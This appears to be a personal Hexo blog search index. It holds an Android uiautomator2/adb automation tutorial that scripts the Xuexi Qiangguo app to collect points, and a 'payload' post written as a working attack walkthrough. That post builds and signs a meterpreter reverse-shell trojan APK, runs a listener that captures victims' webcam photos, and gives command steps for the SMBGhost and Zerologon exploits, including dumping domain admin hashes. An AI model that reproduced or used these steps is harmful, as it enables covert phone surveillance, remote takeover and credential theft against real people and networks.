href="#1-Debug-HTTP-Requests" class="headerlink" title="1. Debug HTTP Requests"></a>1. Debug HTTP Requests</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import uiautomator2 as u2</span><br><span class="line">d = u2.connect(<span class="string">'192.168.1.92)</span></span><br><span class="line"><span class="string">d.debug=True</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="检索设备信息"><a href="#检索设备信息" class="headerlink" title="检索设备信息"></a>检索设备信息</h2><h3 id="1-基本信息"><a href="#1-基本信息" class="headerlink" title="1. 基本信息"></a>1. 基本信息</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//Wlan ip</span><br><span class="line"><span class="built_in">print</span> d.wlan_ip</span><br><span class="line"></span><br><span class="line">//Get device serial number</span><br><span class="line"><span class="built_in">print</span> d.serial</span><br><span class="line"></span><br><span class="line">//equipment information</span><br><span class="line"><span class="built_in">print</span> d.info</span><br><span class="line">//detailed equipment information</span><br><span class="line"><span class="built_in">print</span> d.device_info</span><br></pre></td></tr></tbody></table></figure><h3 id="2-窗体信息"><a href="#2-窗体信息" class="headerlink" title="2. 窗体信息"></a>2. 窗体信息</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//window size</span><br><span class="line"><span class="built_in">print</span>(d.window_size())</span><br></pre></td></tr></tbody></table></figure><h3 id="3-获取app信息"><a href="#3-获取app信息" class="headerlink" title="3. 获取app信息"></a>3. 获取app信息</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//Get current app info</span><br><span class="line"><span class="built_in">print</span> d.current_app()</span><br><span class="line"><span class="built_in">print</span> d.app_info(<span class="string">"com.examples.demo"</span>)  //app info</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="用session来操作APP的开启和关闭"><a href="#用session来操作APP的开启和关闭" class="headerlink" title="用session来操作APP的开启和关闭"></a>用session来操作APP的开启和关闭</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sess = d.session(<span class="string">"com.netease.cloudmusic"</span>) <span class="comment"># 打开app网易云音乐</span></span><br><span class="line">sess.close() <span class="comment"># 停止网易云音乐</span></span><br></pre></td></tr></tbody></table></figure><h2 id="Key-Events"><a href="#Key-Events" class="headerlink" title="Key Events"></a>Key Events</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> d.info.get(<span class="string">'screenOn'</span>)</span><br></pre></td></tr></tbody></table></figure><h3 id="Press-hard-soft-key"><a href="#Press-hard-soft-key" class="headerlink" title="Press hard/soft key"></a>Press hard/soft key</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d.press(<span class="string">"home"</span>) <span class="comment"># press the home key, with key name</span></span><br><span class="line">d.press(<span class="string">"back"</span>) <span class="comment"># press the back key, with key name</span></span><br><span class="line">d.press(0x07, 0x02) <span class="comment"># press keycode 0x07('0') with META ALT(0x02)</span></span><br></pre></td></tr></tbody></table></figure><h2 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h2><h3 id="打开app"><a href="#打开app" class="headerlink" title="打开app"></a>打开app</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//open app</span><br><span class="line">d.app_start(<span class="string">"com.example.hello_world"</span>) //打开app</span><br></pre></td></tr></tbody></table></figure><h3 id="点击事件"><a href="#点击事件" class="headerlink" title="点击事件"></a>点击事件</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">d(text=<span class="string">"学习强国"</span>).click()  //<span class="keyword">in</span> the form of text</span><br><span class="line"></span><br><span class="line">//Click on the screen by means of coordinates</span><br><span class="line">d.click(x, y)</span><br><span class="line"></span><br><span class="line">//Double click</span><br><span class="line">d.double_click(x, y)</span><br><span class="line">d.double_click(x, y, 0.1) <span class="comment"># default duration between two click is 0.1s</span></span><br><span class="line"></span><br><span class="line">// Long click on the screen</span><br><span class="line">d.long_click(x, y)</span><br><span class="line">d.long_click(x, y, 0.5) <span class="comment"># long click 0.5s (default)</span></span><br><span class="line"></span><br><span class="line">//click, swipe, drag操作支持按比例操作</span><br><span class="line">d.long_click(0.5, 0.5) //长按屏幕中心</span><br></pre></td></tr></tbody></table></figure><h3 id="延迟事件"><a href="#延迟事件" class="headerlink" title="延迟事件"></a>延迟事件</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//delay <span class="keyword">in</span> 10 seconds</span><br><span class="line">d.implicitly_wait(10.0) </span><br><span class="line">time.sleep(5)</span><br></pre></td></tr></tbody></table></figure><h3 id="滑动事件"><a href="#滑动事件" class="headerlink" title="滑动事件"></a>滑动事件</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> //Swipe</span><br><span class="line">d.swipe(sx, sy, ex, ey)</span><br><span class="line">d.swipe(sx, sy, ex, ey, 0.5) <span class="comment"># swipe for 0.5s(default)</span></span><br><span class="line"></span><br><span class="line">//Drag</span><br><span class="line">d.drag(sx, sy, ex, ey)</span><br><span class="line">d.drag(sx, sy, ex, ey, 0.5) <span class="comment"># swipe for 0.5s(default)</span></span><br><span class="line"> </span><br><span class="line">//Swipe points</span><br><span class="line"><span class="comment"># swipe from point(x0, y0) to point(x1, y1) then to point(x2, y2) ,time will speed 0.2s bwtween two points</span></span><br><span class="line">d.swipe((x0, y0), (x1, y1), (x2, y2), 0.2)</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="练手小实例"><a href="#练手小实例" class="headerlink" title="练手小实例"></a>练手小实例</h2><h3 id="run-adb"><a href="#run-adb" class="headerlink" title="run adb"></a>run adb</h3><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start adb  //启动adb</span><br><span class="line">adb devices//查看电脑是否连接到手机</span><br><span class="line">python -m weditor//启动weditor</span><br><span class="line">//use wifi link,pc terminal have to execute the following command</span><br><span class="line">adb tcpip 5555  //open PID 5555</span><br></pre></td></tr></tbody></table></figure><h3 id="run-code"><a href="#run-code" class="headerlink" title="run code"></a>run code</h3><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uiautomator2 <span class="keyword">as</span> u2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">d = u2.connect(<span class="string">'192.168.1.65:7912'</span>)  <span class="comment"># d = u2.connect_usb('MV7DH68XXXXXXX')</span></span><br><span class="line">d.debug=<span class="literal">True</span></span><br><span class="line">sess = d.session(<span class="string">"cn.xuexi.android"</span>) <span class="comment"># open xuexiqiangguo</span></span><br><span class="line"><span class="comment">#12 points read the article</span></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">d(text=<span class="string">"北京"</span>).click()</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">d.click(<span class="number">0.114</span>, <span class="number">0.271</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">d.click(<span class="number">0.063</span>, <span class="number">0.064</span>)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line">d(text=<span class="string">"要闻"</span>).click()</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    d.click(<span class="number">0.387</span>, <span class="number">0.362</span>)</span><br><span class="line">    d.swipe(<span class="number">0.451</span>, <span class="number">0.824</span>, <span class="number">0.468</span>, <span class="number">0.356</span>, <span class="number">1</span>) </span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        d.swipe(<span class="number">0.451</span>, <span class="number">0.874</span>, <span class="number">0.451</span>, <span class="number">0.106</span> ,<span class="number">1</span>) </span><br><span class="line">        <span class="keyword">if</span> d(text=<span class="string">"观点"</span>):</span><br><span class="line">            d.click(<span class="number">0.076</span>, <span class="number">0.066</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    d.swipe(<span class="number">0.451</span>, <span class="number">0.824</span>, <span class="number">0.468</span>, <span class="number">0.680</span>, <span class="number">1</span>) </span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">d.click(<span class="number">0.076</span>, <span class="number">0.066</span>)</span><br><span class="line">time.sleep(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#12 points visual and aural learning</span></span><br><span class="line">d(text=<span class="string">"电视台"</span>).click()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    d.click(<span class="number">0.493</span>, <span class="number">0.392</span>)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    d.click(<span class="number">0.74</span>, <span class="number">0.271</span>)</span><br><span class="line">    d.swipe(<span class="number">0.336</span>, <span class="number">0.271</span>, <span class="number">0.736</span>, <span class="number">0.271</span>, <span class="number">1</span>) </span><br><span class="line">    <span class="keyword">if</span> d(text=<span class="string">"重新播放"</span>):</span><br><span class="line">        d.click(<span class="number">0.068</span>, <span class="number">0.068</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    d.click(<span class="number">0.068</span>, <span class="number">0.068</span>)</span><br><span class="line">    d.swipe(<span class="number">0.527</span>, <span class="number">0.771</span>, <span class="number">0.527</span>, <span class="number">0.371</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># print(d.info)</span></span><br></pre></td></tr></tbody></table></figure><hr><h1 id="adb"><a href="#adb" class="headerlink" title="adb"></a>adb</h1><ul><li><p>QQ</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//打开QQ</span><br><span class="line">adb shell am start -a android.intent.action.MAIN -c android.intent.category.LAUNCHER -n com.tencent.mobileqq/com.tencent.mobileqq.activity.SplashActivity</span><br><span class="line">//关闭QQ</span><br><span class="line">adb shell am force-stop com.tencent.mobileqq</span><br></pre></td></tr></tbody></table></figure></li><li><p>微信</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//打开微信</span><br><span class="line">adb shell am start com.tencent.mm/com.tencent.mm.ui.LauncherUI</span><br></pre></td></tr></tbody></table></figure></li><li><p>点击事件</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//点击</span><br><span class="line">adb shell input tap 500 500 </span><br><span class="line">//上下滑动</span><br><span class="line">adb shell input swipe 700 2000 700 1000</span><br><span class="line">//左右滑动</span><br><span class="line">adb shell input swipe 100 1000 1000 1000</span><br></pre></td></tr></tbody></table></figure></li></ul><hr><p>参考:<br><a href="https://www.jianshu.com/p/0d15cd1b5ed9">https://www.jianshu.com/p/0d15cd1b5ed9</a><br><a href="https://www.cnblogs.com/zhouxihi/p/10930923.html">https://www.cnblogs.com/zhouxihi/p/10930923.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> adb </tag>
            
            <tag> uiautomator2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>termux</title>
      <link href="/2020/08/18/termux/"/>
      <url>/2020/08/18/termux/</url>
      
        <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> privilge escalation </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>payload</title>
      <link href="/2020/08/18/payload/"/>
      <url>/2020/08/18/payload/</url>
      
        <content type="html"><![CDATA[<p>#Android payload</p><h2 id="开启端口"><a href="#开启端口" class="headerlink" title="开启端口"></a>开启端口</h2><p>打开终端，安装ufw防火墙，开启5555端口</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ufw</span><br><span class="line">sudo ufw <span class="built_in">enable</span></span><br><span class="line">sudo ufw allow 5555</span><br></pre></td></tr></tbody></table></figure><h2 id="生成payload-apk文件"><a href="#生成payload-apk文件" class="headerlink" title="生成payload apk文件"></a>生成payload apk文件</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.220 LPORT=5555 R &gt; ./a.apk</span><br></pre></td></tr></tbody></table></figure><p>生成apk后还需用到一下工具优化:<br>1.keytools (密钥、证书管理工具)<br>2.Jarsigner(jar签名、校验工具)<br>3.Zipalign(APK优化攻击)需安装</p><hr><ul><li>首先使用keytools生成创建证书:</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -v -keystore apk-trojan-key.keystore -<span class="built_in">alias</span> newbie -keyalg RSA -keysize 1024 -validity 999</span><br></pre></td></tr></tbody></table></figure><p>-v 显示密钥库中的证书详细信息<br>-k eystore 指定密钥库的名称<br>-alias 产生别名<br>-keyalg 指定密钥的算法(默认为DSA)<br>-keysize 指定密钥长度<br>-validity 指定创建的证书有效期多少天(默认90)</p><hr><ul><li><p>然后使用jarsigner进行签名:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk-trojan-key.keystore newbie.apk newbie</span><br></pre></td></tr></tbody></table></figure></li><li><p>verbose 签名/验证时输出详细信息</p></li><li><p>sigalg  签名算法的名称</p></li><li><p>digestalg 摘要算法的名称</p></li><li><p>keystore 密钥库位置<br><code>进行签名文件+别名</code></p></li><li><p>使用-verify对文件签名验证</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verify -verbose newbie.apk</span><br></pre></td></tr></tbody></table></figure></li></ul><hr><ul><li>使用Zipalign优化apk (缺少这一步可能导致部分手机会无法安装)<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zipalign -v 4 newbie.apk  newbie1.apk</span><br></pre></td></tr></tbody></table></figure></li></ul><hr><h2 id="开始监听"><a href="#开始监听" class="headerlink" title="开始监听"></a>开始监听</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler //加载攻击模块</span><br><span class="line"><span class="built_in">set</span> payload android/meterpreter/reverse_tcp  //选择要使用的Payload</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.0.113</span><br><span class="line"><span class="built_in">set</span> LPORT 5555</span><br><span class="line">show options  //查看需要设置的参数</span><br><span class="line"></span><br><span class="line">//注意被侵入对象需要给我们的木马文件一些权限，诸如访问电话，信息，录音，相机，手机存储等权限</span><br><span class="line">exploit  //执行</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webcam_snap -i 1//前置摄像头采集照片</span><br><span class="line">webcam_snap -i 2 //后置摄像头采集照片</span><br></pre></td></tr></tbody></table></figure><p>注意:<code>当有一会时间未及时操作便出现会连接超时，用户需再次点击木马文件，才能继续操作.</code></p><hr><h2 id="查看可以使用的payload类型"><a href="#查看可以使用的payload类型" class="headerlink" title="查看可以使用的payload类型"></a>查看可以使用的payload类型</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | more</span><br></pre></td></tr></tbody></table></figure><hr><h1 id="windows-10-payload-CVE-2020-0796"><a href="#windows-10-payload-CVE-2020-0796" class="headerlink" title="windows 10 payload CVE-2020-0796"></a>windows 10 payload CVE-2020-0796</h1><p>直接拿shell</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows Server, Version 1903 (Server Core installation)<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows Server, Version 1909 (Server Core installation)</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> lport 3333</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.188.177  //靶机win10：192.168.188.177,靶机关闭defender防火墙</span><br><span class="line">exploit</span><br></pre></td></tr></tbody></table></figure><p>下载<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">POC</a></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py -ip win10IP</span><br></pre></td></tr></tbody></table></figure><hr><h1 id="windows-CVE-2020-1472"><a href="#windows-CVE-2020-1472" class="headerlink" title="windows CVE-2020-1472"></a>windows CVE-2020-1472</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1<br>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>Windows Server 2012<br>Windows Server 2012 (Server Core installation)<br>Windows Server 2012 R2<br>Windows Server 2012 R2 (Server Core installation)<br>Windows Server 2016<br>Windows Server 2016 (Server Core installation)<br>Windows Server 2019<br>Windows Server 2019 (Server Core installation)<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)<br>Windows Server, version 2004 (Server Core installation)</p><h2 id="exp地址"><a href="#exp地址" class="headerlink" title="exp地址"></a>exp地址</h2><p>github上的exp进行攻击，exp地址如下：<br><a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p><p>##</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py -n DESKTOP-1VU9SAK -t 10.10.135.211  //要输入计算机名-n  计算机名  -t  域控ip</span><br><span class="line"></span><br><span class="line">secretsdump.py -no-pass -just-dc 2k12vitcim<span class="variable">$@192</span>.168.139.147 //获取管理员ntlm <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">python zerologon_tester.py OWA2010SP3 10.10.135.211</span><br></pre></td></tr></tbody></table></figure><p>wmi获取shell权限</p><hr><p>参考:<br><a href="https://blog.csdn.net/qq_41453285/article/details/93536347">https://blog.csdn.net/qq_41453285/article/details/93536347</a></p><p><a href="https://www.jianshu.com/p/e63006a24603">https://www.jianshu.com/p/e63006a24603</a></p><p>windows CVE-2020-1472<br><a href="https://bbs.secgeeker.net/thread-1579-1-1.html">https://bbs.secgeeker.net/thread-1579-1-1.html</a><br><a href="https://www.cnblogs.com/Yang34/p/13678632.html">https://www.cnblogs.com/Yang34/p/13678632.html</a><br><a href="http://www.hackdig.com/09/hack-134464.htm">http://www.hackdig.com/09/hack-134464.htm</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Payload </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Payload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/1970/01/01/hello-world/"/>
      <url>/1970/01/01/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
